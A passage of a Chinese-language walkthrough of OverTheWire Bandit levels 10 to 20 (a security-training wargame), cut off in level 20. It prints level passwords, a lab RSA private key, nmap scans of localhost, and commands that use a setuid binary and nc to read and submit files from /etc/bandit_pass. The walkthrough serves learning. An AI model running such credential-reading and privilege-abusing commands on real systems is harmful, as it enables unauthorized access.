10\n\n描述：下一个级别的密码存储在文件data.txt中的几个人类可读字符串之一，从几个“=”字符开始。\n\n密码：truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\n```sh\nbandit9@bandit:~$ ls\ndata.txt\nbandit9@bandit:~$ strings data.txt | grep ==\n|========== the\n========== password\n========== is\n========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n```\n\n心路历程：描述中提到了几个人类可读字符，那我们用 strings 筛选一下（strings是在文件中查找可打印字符串并输出长度为4个或更多的字符串，遇到换行或空字符结束）。其中也提到从几个「=」符号开始，那我们用 grep 命令筛选 含有「==」的字符串看看。\n\n---\n\nLevel 10 - 11\n\n描述：下一级别的密码存储在data.txt文件中，该文件包含base64编码数据\n\n密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n\n```sh\nbandit10@bandit:~$ ls\ndata.txt\nbandit10@bandit:~$ cat data.txt\nVGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==\nbandit10@bandit:~$ base64 -d data.txt \nThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n```\n\n心路历程：题目告诉我们使用 base64 编码了数据，那我们解码就好了。\n\n---\n\nLevel 11 - 12\n\n描述：下一级的密码存储在文件data.txt中，其中所有小写（a-z）和大写（A-Z）字母已经被旋转了13个位置\n\n密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n\n```sh\nbandit11@bandit:~$ ls\ndata.txt\nbandit11@bandit:~$ cat data.txt\nGur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh\nbandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\nThe password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n```\n\n心路历程：这里我们用到了 `tr` 命令，参数为两个字符集，把第一个字符集中的字符替换为第二个字符集中的对应字符。题目中说旋转了13个位置，相当于26个字母前十三个和后十三个换了个位置。按照这样的对应关系，调整给出的字符集。\n提示：有人会写程序来做替换，但是对于这道题来讲 tr 会方便很多。虽然这个命令不常用，用起来还是很爽的。\n\n---\n\nLevel 12 - 13\n\n描述：下一级的密码存储在data.txt文件中，该文件是一个已被重复压缩的文件的十六进制转储文件。对于这个级别，可以在 `/tmp` 下使用 `mkdir` 创建一个工作的目录。例如：`mkdir /tmp/myname123` 。然后使用 `cp` 复制数据文件，并使用 `mv` 重命名（阅读manpages！）  \n密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n\n```sh\nbandit12@bandit:~$ ls\ndata.txt\nbandit12@bandit:~$ mkdir /tmp/GeekaLeo123 ; cp data.txt /tmp/GeekaLeo123/data_1 ; cd /tmp/GeekaLeo123\nbandit12@bandit:/tmp/GeekaLeo123$ cat data_1 ; file data_1\n0000000: 1f8b 0808 5601 cd59 0203 6461 7461 322e  ....V..Y..data2.\n0000010: 6269 6e00 013f 02c0 fd42 5a68 3931 4159  bin..?...BZh91AY\n0000020: 2653 5914 13ca ff00 001b ffff faef 7fff  &SY.............\n0000030: f9fb a79e de5b efbb ffff fd7f cf7b fbff  .....[.......{..\n0000040: ff7f afbd 8ddb ff77 f752 ffff b001 3b56  .......w.R....;V\n0000050: 6100 01a3 d400 0000 0068 d0d0 69a0 0000  a........h..i...\n0000060: 007a 867a 9034 0340 6401 a340 0000 f280  .z.z.4.@d..@....\n0000070: 01ea 0d1a 1a1a 0d01 9034 0e40 0000 0686  .........4.@....\n0000080: 8d00 00c8 6819 3406 8d1e a003 d400 0c80  ....h.4.........\n0000090: f534 0034 309a 0006 83d4 0000 01a6 80c8  .4.40...........\n00000a0: 1900 6103 a01b 5034 69a1 a1a0 6868 3403  ..a...P4i...hh4.\n00000b0: 4341 a340 64f5 3400 0680 6801 a340 6800  CA.@d.4...h..@h.\n00000c0: 000d 0068 0340 00d0 01a1 a068 3430 3516  ...h.@.....h405.\n00000d0: 1543 1355 0d26 5d39 505d 970e fcac 9c37  .C.U.&]9P].....7\n00000e0: 0ec4 62b1 05bc 607b 68e4 c4f4 efa3 32f8  ..b...`{h.....2.\n00000f0: 6d9e 9c52 9d50 36a0 5598 b734 a0c4 7683  m..R.P6.U..4..v.\n0000100: 04e3 7cbd ec15 ea5d 1db8 1283 ea8b 4318  ..|....]......C.\n0000110: 0358 207a a12c 554f 4a2d 5428 eb47 6e7c  .X z.,UOJ-T(.Gn|\n0000120: ffdc 4018 60fc 0690 28ec 12b9 5d02 eecb  ..@.`...(...]...\n0000130: 11d4 e987 eb36 d574 e87c 2e67 f803 2cdf  .....6.t.|.g..,.\n0000140: b465 9110 302d a9c0 0c33 3e55 573c 8818  .e..0-...3>UW<..\n0000150: 76cf 6c6a 5efd c51e 20ec 2358 f5a8 694e  v.lj^... .#X..iN\n0000160: bc7a bc91 0376 ebc8 61a2 33c1 97e9 936d  .z...v..a.3....m\n0000170: df2b ceef 0a4f 6039 8cb5 b9cc d490 607b  .+...O`9......`{\n0000180: ff20 e253 1875 489a 0465 3643 497e 8348  . .S.uH..e6CI~.H\n0000190: 51dd d85e 5038 9c31 fcc3 bb2b 6157 0413  Q..^P8.1...+aW..\n00001a0: 7b90 6633 f706 0005 3dc0 7d9b f4ba b026  {.f3....=.}....&\n00001b0: 1a91 eca8 8423 7d1b 0401 d150 0c14 1fc5  .....#}....P....\n00001c0: ef57 ef39 3e53 dfc5 c2ce 29de 871f dce8  .W.9>S....).....\n00001d0: 2f85 3ff8 1f16 a894 6677 d26e a7b6 2550  /.?.....fw.n..%P\n00001e0: bc05 d2e6 51f8 d799 52f1 2783 a642 db4e  ....Q...R.'..B.N\n00001f0: 344f b1a4 608c 4249 20f6 549e 64db e2e8  4O..`.BI .T.d...\n0000200: 55da 10b5 adfc 28fd 1a8c 7e81 4188 5028  U.....(...~.A.P(\n0000210: 29ec ddf4 4bef 8de6 9a0b 0d49 14e7 d30e  )...K......I....\n0000220: 48a4 55b8 5729 7484 2900 e001 e451 7290  H.U.W)t.)....Qr.\n0000230: 057c f004 bb85 0788 0139 d730 8a08 0448  .|.......9.0...H\n0000240: 4a45 0565 243c 7017 9906 e644 ff8b b922  JE.e$<p....D...\"\n0000250: 9c28 480a 09e5 7f80 c978 5ff9 3f02 0000  .(H......x_.?...\ndata_1: ASCII text\nbandit12@bandit:/tmp/GeekaLeo123$ xxd -r data_1 > data_2 ; file data_2\ndata_2: gzip compressed data, was \"data2.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_2 data_3.gz ; gzip -d data_3.gz ; ls\ndata_1  data_3\nbandit12@bandit:/tmp/GeekaLeo123$ file data_3\ndata_3: bzip2 compressed data, block size = 900k\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_3 data_4.bz2 ; bzip2 -d data_4.bz2 ; ls\ndata_1  data_4\nbandit12@bandit:/tmp/GeekaLeo123$ file data_4\ndata_4: gzip compressed data, was \"data4.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_4 data_5.gz ; gzip -d data_5.gz ; ls\ndata_1  data_5\nbandit12@bandit:/tmp/GeekaLeo123$ file data_5\ndata_5: POSIX tar archive (GNU)\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_5 data_6.tar ; tar -xvf data_6.tar ; ls\ndata5.bin\ndata5.bin  data_1  data_6.tar\nbandit12@bandit:/tmp/GeekaLeo123$ file data5.bin \ndata5.bin: POSIX tar archive (GNU)\nbandit12@bandit:/tmp/GeekaLeo123$ mv data5.bin data_7.tar; tar -xvf data_7.tar ; ls \ndata6.bin\ndata6.bin  data_1  data_6.tar  data_7.tar\nbandit12@bandit:/tmp/GeekaLeo123$ file data6.bin\ndata6.bin: bzip2 compressed data, block size = 900k\nbandit12@bandit:/tmp/GeekaLeo123$ mv data6.bin data_8.bz2 ; bzip2 -d data_8.bz2 ; ls\ndata_1  data_6.tar  data_7.tar  data_8\nbandit12@bandit:/tmp/GeekaLeo123$ file data_8\ndata_8: POSIX tar archive (GNU)\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_8 data_9.tar ; tar -xvf data_9.tar ; ls\ndata8.bin\ndata8.bin  data_1  data_6.tar  data_7.tar  data_9.tar\nbandit12@bandit:/tmp/GeekaLeo123$ file data8.bin\ndata8.bin: gzip compressed data, was \"data9.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression\nbandit12@bandit:/tmp/GeekaLeo123$ mv data8.bin data_10.gz ; gzip -d data_10.gz ; ls\ndata_1  data_10  data_6.tar  data_7.tar  data_9.tar\nbandit12@bandit:/tmp/GeekaLeo123$ file data_10\ndata_10: ASCII text\nbandit12@bandit:/tmp/GeekaLeo123$ cat data_10\nThe password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n```\n\n心路历程：这关比较恶心了……按照对应的加密方式解密就好，用 `file` 查看文件类型，`mv` 命令修改名字，还有`bzip2 -d`、`gzip -d`、`tar -xvf`以及`xxd -r` 这些解密解压方法。\n\n---\n\nLevel 13 - 14\n\n描述：下一级的密码存储在`/etc/bandit\\_pass/bandit14` 中，只能由用户bandit14读取。对于这个级别，你不会得到下一个密码，但你会得到一个私人的SSH密钥，可以用来登录到下一个级别。注意：localhost是指您正在使用的机器的主机名  \n密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n\n```sh\nbandit13@bandit:~$ ls\nsshkey.private\nbandit13@bandit:~$ ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220\nThe authenticity of host '[bandit.labs.overthewire.org]:2220 ([0.0.0.0]:2220)' can't be established.\nECDSA key fingerprint is ee:4c:8c:e7:57:2c:bc:63:24:b8:e6:23:27:63:72:9f.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '[bandit.labs.overthewire.org]:2220,[0.0.0.0]:2220' (ECDSA) to the list of known hosts.\n...\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\nbandit14@bandit:~$ cat /etc/bandit_pass/bandit14  \n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n```\n\n心路历程：告诉我们需要 ssh 登陆进去，自己去找密码，我们就登录一下好了。\n\n---\n\nLevel 14 - 15\n描述：通过将当前级别的密码提交到localhost上的端口30000，可以检索到下一级别的密码。\n密码：BfMYroe26WYalil77FoDi9qh59eK5xNr\n\n```sh\nbandit14@bandit:~$ nc localhost 30000 < /etc/bandit_pass/bandit14\nCorrect!\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n```\n\n心路历程：我们使用 `nc` 命令来发送我们的密码，因为上一关我们已经知道密码在那放着了，刚好可以用到。\n提示：什么？你想直接查看其他关的密码？不存在的……（权限啊老铁）\n\n---\n\nLevel 15 -16\n\n描述：可以通过使用SSL加密将当前级别的密码提交到本地主机上的端口30001来检索下一级别的密码。\n\n密码：\n\n```sh\nbandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof                          \nCONNECTED(00000003)\ndepth=0 CN = 8f75dc271013\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = 8f75dc271013\nverify return:1\n---\nCertificate chain\n 0 s:/CN=8f75dc271013\n   i:/CN=8f75dc271013\n---\nServer certificate\n-----BEGIN CERTIFICATE-----\nMIICvjCCAaagAwIBAgIJALADbwWQ0u9aMA0GCSqGSIb3DQEBCwUAMBcxFTATBgNV\nBAMTDDhmNzVkYzI3MTAxMzAeFw0xNzA5MTYwNzAyMjRaFw0yNzA5MTQwNzAyMjRa\nMBcxFTATBgNVBAMTDDhmNzVkYzI3MTAxMzCCASIwDQYJKoZIhvcNAQEBBQADggEP\nADCCAQoCggEBALmjBUTlmjROJUssm+rAlFADFfzrz+xCH0qUXryou5/wW8pnQ6nG\nHbdeRIBwTVGFiDIKRbFdWQU4BbrfjEhyGn9d7eh/3GV09ZdvLDYRoLmJ4tDF8CiC\nwGl9GufcWr3zeaNYa8CwVdtWam8umhMICrsv7B5iV9RdSQfudUtVbr26SBVyuhBm\nm0t7Su6rLCrrGtshdIihjk4k67bBMpSNAOduhpp79UgIPKcwJUhRJHTcji3m/IQ8\nO9zNS25oL8KhMn7e/Xe70kztstq0ShMsx8feutONnGulUOlaEMMqW+HSWgnVeG/r\nmU9Nzwn++4qxe16OvvmXAzctH2RlDx7XbcsCAwEAAaMNMAswCQYDVR0TBAIwADAN\nBgkqhkiG9w0BAQsFAAOCAQEADHODX5CcMLI5fdumzly5FAVg5Yc22eDGNhmyhi/N\nkDhP6QYw+HW5nWEYapc9m/ZQGEEoxr+wj6qeEhscxRxpuEIcunZsLKcoAmToyXeO\nANMslQugRcGqN57Pt0h5VuctLMa3ickeVPFvV6gxJSHBNRK1iN8nrfsy+zR+stzI\nxcjIuakDDxMKFtb/1TMKf4/EsimSQLS0WXLjbxfQ/J510O4/Of0tmZI0ZIG+cKmM\nV5hAOtuuAk6jREfWYJQ3DB+phv7PO9s2FpofVJss5PK4NWDS7UQOv359ZOJ85ZpJ\nihGxDqV7IAHJZNM9lvFXz/+EOn1oTGW9V8bAwt34OVYoPw==\n-----END CERTIFICATE-----\nsubject=/CN=8f75dc271013\nissuer=/CN=8f75dc271013\n---\nNo client certificate CA names sent\n---\nSSL handshake has read 1682 bytes and written 637 bytes\n---\nNew, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA\nServer public key is 2048 bit\nSecure Renegotiation IS supported\nCompression: NONE\nExpansion: NONE\nSSL-Session:\n    Protocol  : SSLv3\n    Cipher    : DHE-RSA-AES256-SHA\n    Session-ID: C193C0A99C7335DB7D7B7B89367CF5E6A514E4FF58066E86A47070BCD02F7BC5\n    Session-ID-ctx: \n    Master-Key: 5D0EB4E12667C302D7D9AAB88855BF67DA51124248593FC4B5613C6BBCF69C145BF0B37DCA5A3765A8DFD2EBDC84B248\n    Key-Arg   : None\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    Start Time: 1510423808\n    Timeout   : 300 (sec)\n    Verify return code: 18 (self signed certificate)\n---\nBfMYroe26WYalil77FoDi9qh59eK5xNr\nCorrect!\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\nread:errno=0\n```\n\n心路历程：我们使用 `openssl` 的 `s\\_client` SSL/TSL 客户端程序连接服务器，成功后复制粘贴我们本关的密码就能得到下一关的密码了。多看手册哦。\n提示：\n```bash\nbandit15@bandit:~$ man openssl\nbandit15@bandit:~$ man s_client\n```\n\n---\n\nLevel 16 -17\n描述：可以通过将当前级别的密码提交到本地主机上31000到32000范围内的端口来检索下一级别的凭证。首先找出哪些端口有服务器正在侦听它们。然后找出哪些人说SSL和哪些不。只有一个服务器会提供下一个凭据，其他的只是发回你发给它的内容。\n密码：xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn\n\n```sh\n# 先扫描开放端口\nbandit16@bandit:~$ nmap -p 31000-32000 localhost\n\nStarting Nmap 6.40 ( http://nmap.org ) at 2017-11-12 09:08 UTC\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00047s latency).\nOther addresses for localhost (not scanned): 127.0.0.1\nNot shown: 996 closed ports\nPORT      STATE SERVICE\n31046/tcp open  unknown\n31518/tcp open  unknown\n31691/tcp open  unknown\n31790/tcp open  unknown\n31960/tcp open  unknown\n\n# 依次给5个端口发送消息,其他端口只会返回你发给它的内容。\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31046    \nHello World!\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31518\nERROR\n140737354053280:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:351:\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31691\nHello World!\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31790\nERROR\n140737354053280:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:351:\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31960\nHello World!\n\n# 我们发现有两个端口是SSL的，分别给这两个端口发送数据测试。\nbandit16@bandit:~$ echo \"Hello World\" | openssl s_client -quiet -connect localhost:31518\ndepth=0 CN = 8f75dc271013\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = 8f75dc271013\nverify return:1\nHello World\n# 因为回复了Hello World，确定这个属于「其他端口」这里直接发送密码给 31790 端口\nbandit16@bandit:~$ cat /etc/bandit_pass/bandit16 | openssl s_client -quiet -connect localhost:31790\ndepth=0 CN = 8f75dc271013\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = 8f75dc271013\nverify return:1\nCorrect!\n-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ\nimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ\nJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu\nDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW\nJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX\nx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD\nKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl\nJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd\nd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC\nYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A\nvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama\n+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT\n8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx\nSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd\nHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt\nSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A\nR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi\nTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg\nR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu\nL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni\nblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU\nYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM\n77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b\ndxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3\nvBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=\n-----END RSA PRIVATE KEY-----\n\nread:errno=0\n\n# 存到文件中\nbandit16@bandit:~$ echo \"-----BEGIN RSA PRIVATE KEY-----\n> MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ\n> imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ\n> Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu\n> DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW\n> JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX\n> x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD\n> KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl\n> J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd\n> d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC\n> YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A\n> vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama\n> +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT\n> 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx\n> SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd\n> HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt\n> SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A\n> R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi\n> Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg\n> R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu\n> L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni\n> blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU\n> YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM\n> 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b\n> dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3\n> vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=\n> -----END RSA PRIVATE KEY-----\" > ssh.private\n\n# 修改文件权限，确保他人不被允许访问这个文件，不然不会被认证端认同\nbandit16@bandit:~$ chmod 600 ssh.private\n\n# 连接\nbandit16@bandit:~$ ssh -i ssh.private bandit17@localhost -p 2220\n _                     _ _ _   \n| |__   __ _ _ __   __| (_) |_ \n| '_ \\ / _` | '_ \\ / _` | | __|\n| |_) | (_| | | | | (_| | | |_ \n|_.__/ \\__,_|_| |_|\\__,_|_|\\__|\n                               \na http://www.overthewire.org wargame.\n\n...\nbandit17@bandit:~$ cat /etc/bandit_pass/bandit17\nxLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn\n```\n\n心路历程：这关把过程注释在了上面的代码中，帮助大家路顺思路，这里就不赘述了。\n\n---\n\nLevel 17 -18\n\n描述：homedirectory中有两个文件：passwords.old和passwords.new。下一级的密码是passwords.new中跟.old唯一不同的一行\n\n密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n\n```sh\nbandit17@bandit:~$ ll\ntotal 44\ndrwxr-xr-x  4 bandit17 bandit17 4096 Nov 12 10:42 ./\ndrwxr-xr-x 30 root     root     4096 Nov 12 10:42 ../\n-rw-r-----  1 bandit17 bandit17   33 Sep 28 14:04 .bandit16.password\n-rw-r--r--  1 bandit17 bandit17  220 Apr  9  2014 .bash_logout\n-rw-r--r--  1 bandit17 bandit17 3637 Apr  9  2014 .bashrc\ndrwx------  2 bandit17 bandit17 4096 Nov 12 10:42 .cache/\n-rw-r--r--  1 bandit17 bandit17  675 Apr  9  2014 .profile\ndrwxr-xr-x  2 root     root     4096 Sep 28 14:04 .ssh/\n-rw-r-----  1 bandit17 bandit17 1704 Sep 28 14:04 .ssl-cert-snakeoil.key\n-rw-r-----  1 bandit18 bandit17 3300 Sep 28 14:04 passwords.new\n-rw-r-----  1 bandit18 bandit17 3300 Sep 28 14:04 passwords.old\nbandit17@bandit:~$ diff passwords.old passwords.new\n42c42\n< R3GQabj3vKRTcjTTISWvO1RJWc5sqSXO\n---\n> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n```\n\n心路历程：描述说的很清晰，这里直接 diff 就好了。\n\n---\n\nLevel 18 -19\n\n描述：下一级别的密码存储在家庭目录中的 readme 文件中。不幸的是，当你用SSH登录时，有人修改了.bashrc将你注销。\n\n密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n\n这里就厉害了……\n![IMAGE](/Image/bandit_resources/5C57A9F0545D1CDEA58442EEDC952A51.jpg)\n输入密码后，跟我说了句拜拜然后给我一脚……\n卧槽忍不了。\n常年看 man 手册的老司机表示年轻人要低调，密码我还是能拿到。\n先看 `man ssh` 说了什么：\n![IMAGE](/Image/bandit_resources/5750971C77CDE09AD8C9ED4D020D4701.jpg)\nSecure Shell 中的配置页面也预留了 Command 配置:\n![IMAGE](/Image/bandit_resources/AD0B25D055288B2474EDD87D747BCF9F.jpg)\n配置好之后点连接，输入密码：\n```bash\n _                     _ _ _   \n| |__   __ _ _ __   __| (_) |_ \n| '_ \\ / _` | '_ \\ / _` | | __|\n| |_) | (_| | | | | (_| | | |_ \n|_.__/ \\__,_|_| |_|\\__,_|_|\\__|\n                               \na http://www.overthewire.org wargame.\n\nbandit18@bandit.labs.overthewire.org's password: \nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n```\n\n心路历程：如果事先不知道，卡住是正常的，但是如果之前用到 `ssh` 命令的时候仔细看看 man 手册，不知道吗？不存在的……\n该反省的反省。\n\n--- \n\nLevel 19 - 20\n\n描述：要访问下一个级别，您应该使用homeu目录中的setuid二进制文件。 不带参数的执行它找出如何使用它。 在使用setuid二进制文件后，可以在通常的地方（/etc/bandit\\_pass）找到这个级别的密码。\n\n密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j\n\n说实话我没抬读懂这个 setuid binary，不过不影响。大致意思就是告诉你 Home 目录下有个文件，先不带参数执行一下，他会告诉你怎么用。\n\n```sh\n\nbandit19@bandit:~$ ll\ntotal 32\ndrwxr-xr-x  3 bandit19 bandit19 4096 Nov 12 11:30 ./\ndrwxr-xr-x 30 root     root     4096 Nov 12 11:30 ../\n-rw-r--r--  1 bandit19 bandit19  220 Apr  9  2014 .bash_logout\n-rw-r--r--  1 bandit19 bandit19 3637 Apr  9  2014 .bashrc\ndrwx------  2 bandit19 bandit19 4096 Nov 12 11:30 .cache/\n-rw-r--r--  1 bandit19 bandit19  675 Apr  9  2014 .profile\n-rwsr-x---  1 bandit20 bandit19 7378 Sep 28 14:04 bandit20-do*\n# 看起来就是bandit20-do了\nbandit19@bandit:~$ ./bandit20-do \nRun a command as another user.\n  Example: ./bandit20-do id\nbandit19@bandit:~$ ./bandit20-do\n# 人家已经告诉你了，会使用另一个用户执行命令，再返回去看一眼她的权限 -rwsr-x---\nbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n```\n\n心路历程：嗯，有种报复社会的感觉。\n\n---\n\nLevel 20 -21\n\n描述：homedirectory中有一个setuid二进制文件，它执行以下操作：它将连接 localhost:[命令行参数的上的端口]。然后从连接中读取一行文本，并将其与上一级（bandit20）中的密码进行比较。如果密码正确，将传送下一级密码（bandit21）。\n\n注意：基础设施的变化使这一层面更加困难。您将需要找出在同一个Docker实例中启动多个命令的方法。\n\n密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n\n这关的大意呢是告诉你，你的 Home 目录下有一个二进制文件（setuid又出现了……），你执行它，并提供给它端口号，它会请求这个端口并获取这个端口提供给他的数据，如果数据和 bandit20 的密码相同，他就会告诉你下一关的密码。\n并且给了注意事项:[Changes to the infrastructure](http://overthewire.org/help/sshinfra.html)。\n注意事项中提到了他们的游戏是运行在 Docker 容器上的，默认会给每一次连接分配一个全新的环境，如果当你完成游戏需要开启两个终端 并会产生交互的话，可能需要一些特殊的手段（ssh -L localport:host:port），我们后面再讲这个操作，先分析下他要我们干什么。\n\n他提到：这个程序会访问 localhost 的[你提供的端口号]来获取数据。这里我们需要处理两件事情：1.运行这个程序。2.创建一个监听事件并会回复这个程序当前关的密码。\n监听端口与访问端口有可能用到两个终端，而且是存在交互的，这也是他给我们提示的初衷。\n我们做这关呢，有两个解法。一个是本着学习的态度，走提示流程，一个是日常野路子解法。我们先说说提示的思路。\n\n### 思路一：\n这个跑在 Docker 容器内的游戏，每一次连接都是全新的环境，那我们一个监听，一个请求，需要保证两个终端能够通信，监听的一段正常监听，请求的一端再去请求。所以我们现在要创建两个能交互的终端。方法是借助 `ssl -L` 